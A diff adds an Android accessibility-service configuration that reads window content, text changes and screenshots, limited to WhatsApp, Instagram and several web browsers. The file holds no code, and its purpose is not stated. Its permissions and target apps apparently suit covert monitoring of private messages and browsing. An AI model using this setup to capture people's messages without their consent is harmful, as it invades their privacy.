@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeWindowContentChanged|typeWindowStateChanged|typeViewTextChanged"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagDefault|flagReportViewIds|flagRetrieveInteractiveWindows"
+    android:canRetrieveWindowContent="true"
+    android:canTakeScreenshot="true"
+    android:description="@string/accessibility_service_desc"
+    android:notificationTimeout="10"
+    android:packageNames="com.whatsapp,com.whatsapp.w4b,com.instagram.android,com.android.chrome,com.lemurbrowser.exts,com.brave.browser,com.microsoft.emmx,org.mozilla.firefox,com.sec.android.app.sbrowser,com.opera.browser"
+    android:settingsActivity="com.example.MainActivity" />
